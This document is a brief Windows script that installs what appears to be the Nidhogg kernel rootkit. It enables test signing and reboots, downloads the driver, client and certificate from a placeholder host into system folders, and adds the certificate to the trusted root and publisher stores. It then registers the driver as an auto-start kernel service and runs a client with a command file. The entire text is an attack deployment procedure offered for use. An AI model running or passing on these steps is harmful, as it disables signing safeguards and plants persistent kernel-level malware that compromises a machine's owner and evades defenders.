# 1. Enable test signing (requires reboot)
bcdedit /set testsigning on
shutdown /r /t 0

# 2. After reboot, download files (replace <URL> with your host)
[Net.ServicePointManager]::SecurityProtocol = 'Tls12'
iwr "<URL>/Nidhogg.sys" -OutFile C:\Windows\System32\drivers\Nidhogg.sys
iwr "<URL>/NidhoggClient.exe" -OutFile C:\Windows\System32\NidhoggClient.exe
iwr "<URL>/Nidhogg.cer" -OutFile $env:TEMP\Nidhogg.cer

# 3. Trust the cert
certutil -addstore Root $env:TEMP\Nidhogg.cer
certutil -addstore TrustedPublisher $env:TEMP\Nidhogg.cer

# 4. Create and start the service
sc.exe create Nidhogg type= kernel start= auto binPath= C:\Windows\System32\drivers\Nidhogg.sys
sc.exe start Nidhogg

$p = Start-Process .\MainOps.exe -PassThru
$pid = $p.Id

NidhoggClient.exe < commands.txt
